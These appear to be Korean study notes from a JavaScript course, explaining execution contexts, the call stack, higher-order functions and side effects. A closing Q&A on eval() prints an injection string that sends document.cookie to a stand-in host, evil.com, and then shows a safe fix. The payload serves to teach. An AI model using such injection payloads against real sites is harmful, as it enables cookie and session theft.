# JavaScript: The Hard Parts v3 - Copy and Change an Array

## 1. 학습 목표

배열을 복사하고 변환하는 함수를 직접 구현하면서, 자바스크립트의 실행 모델(실행 컨텍스트, 콜 스택, 메모리)을 이해하고, 반복 코드의 문제점과 고차 함수(Higher-Order Function)가 필요한 이유를 파악합니다.

---

## 2. 자바스크립트 실행 모델 복습

자바스크립트를 실행하면 세 가지가 활성화됩니다.

| 구성 요소 | 설명 |
|---|---|
| <b>전역 스코프(Global Scope)</b> | 코드 전체에서 접근 가능한 범위 |
| <b>전역 실행 컨텍스트(Global Execution Context)</b> | 코드가 실행되는 공간. 전역 메모리(Global Memory)와 단일 스레드(Single Thread)로 구성 |
| <b>콜 스택(Call Stack)</b> | 현재 함수 실행 위치를 추적하는 스택 |

- **단일 스레드(Single Thread)**: 한 번에 하나씩, 페이지를 따라 줄 단위로 실행합니다.
- **전역 메모리(Global Memory)**: 레이블과 데이터를 저장하여 나중에 참조할 수 있습니다.

---

## 3. `copyArrayAndMultiplyBy2` 실행 추적

```javascript
function copyArrayAndMultiplyBy2(array) {
  const output = [];
  for (let i = 0; i < array.length; i++) {
    output.push(array[i] * 2);
  }
  return output;
}

const myArray = [1, 2, 3];
const result = copyArrayAndMultiplyBy2(myArray);
```

### 전역 메모리에 저장되는 순서

1. `copyArrayAndMultiplyBy2` → 함수 전체 코드(문자열로 저장)
2. `myArray` → `[1, 2, 3]`
3. `result` → 함수 호출 완료 후 반환값

### 함수 호출 시: 새로운 실행 컨텍스트(Execution Context) 생성

함수를 호출하면 **로컬 실행 컨텍스트(Local Execution Context)**가 생성됩니다.

| 구성 요소 | 내용 |
|---|---|
| <b>로컬 메모리(Local Memory)</b> | 함수 실행 중에만 사용 가능한 데이터 저장 공간 |
| `array` (매개변수) | `[1, 2, 3]` (인수로 전달된 `myArray`의 참조) |
| `output` | `[]` (빈 배열로 초기화) |

### 콜 스택 변화

```
[copyArrayAndMultiplyBy2]  ← 함수 실행 중 추가
[global]                   ← 항상 아래에 위치
```

함수 실행이 완료되면 콜 스택에서 제거되고, 로컬 메모리도 사라집니다.

### for 루프 실행 과정

| i 값 | 배열 요소 | 계산 | output 상태 |
|---|---|---|---|
| 0 | 1 | 1 × 2 = 2 | [2] |
| 1 | 2 | 2 × 2 = 4 | [2, 4] |
| 2 | 3 | 3 × 2 = 6 | [2, 4, 6] |

`return output` → `result`에 `[2, 4, 6]` 할당

---

## 4. 반복 코드의 문제점: DRY 원칙 위반

비슷한 함수를 계속 만들면 어떤 문제가 생길까요?

```javascript
function copyArrayAndMultiplyBy2(array) { /* ... */ }
function copyArrayAndDivideBy2(array) { /* ... */ }
function copyArrayAndAdd3(array) { /* ... */ }
```

매번 변하는 것은 **배열의 각 요소에 적용하는 연산(Operation) 하나뿐**입니다.

이는 **DRY(Don't Repeat Yourself)** 원칙을 위반합니다.

<details>
<summary>copyArrayAndDivideBy2 실행 추적 예시</summary>

```javascript
function copyArrayAndDivideBy2(array) {
  const output = [];
  for (let i = 0; i < array.length; i++) {
    output.push(array[i] / 2);
  }
  return output;
}

const myArray = [1, 2, 3];
const result = copyArrayAndDivideBy2(myArray);
// result → [0.5, 1, 1.5]
```

- 매개변수(Parameter): `array` — 자리표시자(Placeholder) 역할
- 인수(Argument): `myArray` — 실제 전달되는 값 `[1, 2, 3]`
- 반환값: `[0.5, 1, 1.5]`

</details>

---

## 5. 해결책: 기능(Functionality)을 매개변수로 전달

### 왜 단순 매개변수 추가로는 부족한가?

연산 자체를 매개변수로 전달하고 싶지만, `+3`이나 `×2` 같은 **연산자(Operator)를 직접 전달할 수는 없습니다**.

```javascript
// 이런 건 불가능합니다
copyArrayAndApply(myArray, *2);  // ❌
copyArrayAndApply(myArray, /2);  // ❌
```

`eval()`로 문자열을 코드로 변환하는 방법도 있지만, 보안상 매우 위험합니다.

### 해결책: 기능을 함수로 감싸서 전달

자바스크립트에서는 기능을 **함수(Function)** 안에 감싸면 매개변수로 전달할 수 있습니다.

```javascript
function multiplyBy2(input) { return input * 2; }
function divideBy2(input) { return input / 2; }
function add3(input) { return input + 3; }

// 함수를 인수로 전달 → 고차 함수(Higher-Order Function)
copyArrayAndApply(myArray, multiplyBy2);
copyArrayAndApply(myArray, divideBy2);
copyArrayAndApply(myArray, add3);
```

이것이 **고차 함수(Higher-Order Function)**의 핵심 아이디어입니다.

---

## 6. 입력 배열을 변경하지 않아야하는 이유: 사이드 이펙트(Side Effect)

### 참조(Reference) 전달 방식

배열을 함수에 전달할 때, 배열의 **복사본이 아닌 원본에 대한 참조**가 전달됩니다.

```javascript
const myArray = [1, 2, 3];
copyArrayAndMultiplyBy2(myArray);
// myArray는 전역에서 정의됨 → 참조로 전달됨
```

### 사이드 이펙트(Side Effect)란?

함수 내부에서 일어나는 일이 **반환값으로 정의되지 않은 외부에 영향을 미치는 것**입니다.

| 방식 | 설명 | 권장 여부 |
|---|---|---|
| 입력 배열을 직접 수정 | 전역 데이터에 예상치 못한 영향 | ❌ 비권장 |
| 새 배열을 만들어 반환 | 함수의 결과가 반환값으로만 정의됨 | ✅ 권장 |

```javascript
function copyArrayAndMultiplyBy2(array) {
  const output = [];  // 새 배열 생성
  for (let i = 0; i < array.length; i++) {
    output.push(array[i] * 2);  // 원본 변경 없이 새 배열에 추가
  }
  return output;  // 새 배열 반환
}
```

### 이상적인 함수의 동작

- 입력 배열을 받아 **내부에서 새 배열을 생성**합니다.
- **새 배열을 반환**합니다.
- 입력 배열은 변경되지 않습니다.
- 함수의 동작은 **반환값으로 완전히 정의**됩니다.

> 함수가 실행될 때마다 전역 데이터에 예상치 못한 영향을 미쳐서는 안 됩니다. 반환값이 함수의 유일한 결과물이어야 합니다.

---

## 7. 핵심 개념 정리

| 개념 | 설명 |
|---|---|
| <b>실행 컨텍스트(Execution Context)</b> | 코드가 실행되는 공간. 전역/로컬 두 가지 |
| <b>로컬 메모리(Local Memory)</b> | 함수 실행 중에만 존재하는 데이터 저장 공간 |
| <b>콜 스택(Call Stack)</b> | 현재 실행 위치를 추적하는 스택 구조 |
| <b>매개변수(Parameter)</b> | 함수 정의 시 선언하는 자리표시자(Placeholder) |
| <b>인수(Argument)</b> | 함수 호출 시 실제로 전달하는 값 |
| <b>DRY 원칙</b> | Don't Repeat Yourself — 반복을 피하고 일반화 |
| <b>사이드 이펙트(Side Effect)</b> | 반환값 외에 외부에 영향을 미치는 동작 |
| <b>고차 함수(Higher-Order Function)</b> | 함수를 인수로 받거나 함수를 반환하는 함수 |

---

## Q&A

<details>
<summary>eval()이 보안상 위험한 이유는 무엇입니까?</summary>

임의의 문자열을 실행 가능한 코드로 변환하기 때문입니다. 외부 입력(사용자 입력, API 응답 등)이 `eval()`에 전달되면 악의적인 코드가 그대로 실행됩니다.

- **코드 인젝션**: 공격자가 임의의 코드를 주입하여 실행 가능
- **로컬 스코프 접근**: 실행 스코프의 변수를 읽거나 수정 가능
- **XSS**: 웹 환경에서 다른 사용자의 세션 탈취 등 공격에 악용 가능

```javascript
// UI 입력 필드, URL 파라미터, API 응답 등 외부 데이터를 eval()에 넣으면 위험
function getElement(arr, indexInput) {
  const index = eval(indexInput); // ❌ 위험
  return arr[index];
}

const data = [10, 20, 30];

// 공격자가 입력한 값 (UI 입력, URL 쿼리 파라미터 등)
getElement(data, "0); fetch('https://evil.com?cookie=' + document.cookie); (0");
// → document.cookie가 외부 서버로 전송됨

// ✅ 안전한 버전
function getElement(arr, indexInput) {
  const index = Number(indexInput); // 숫자로만 변환
  return arr[index];
}
```

꼭 UI 입력 필드가 아니어도, **개발자가 완전히 통제할 수 없는 외부 데이터**(URL 파라미터, API 응답, 쿠키 등)라면 모두 해당됩니다. 직접 하드코딩한 문자열이라면 위험하지 않습니다.

</details>

<details>
<summary>eval()은 위험하다면 왜 만들어졌습니까?</summary>

`eval()`은 정당한 용도로 설계되었습니다.

- **JSON 파싱**: `JSON.parse()`가 없던 시절, JSON 문자열을 객체로 변환하는 방법이었습니다.
- **REPL 환경**: 브라우저 개발자 도구처럼 사용자가 입력한 코드를 즉시 실행하는 환경에 사용됩니다.
- **동적 코드 생성**: 코드 자체를 프로그래밍적으로 생성해야 하는 메타프로그래밍(Metaprogramming) 상황에 활용됩니다.

현대 JavaScript에서는 동일한 목적을 더 안전하게 달성하는 대안(`JSON.parse`, 함수 객체 전달 등)이 생겨 `eval()`을 사용할 이유가 거의 없어졌습니다.

</details>
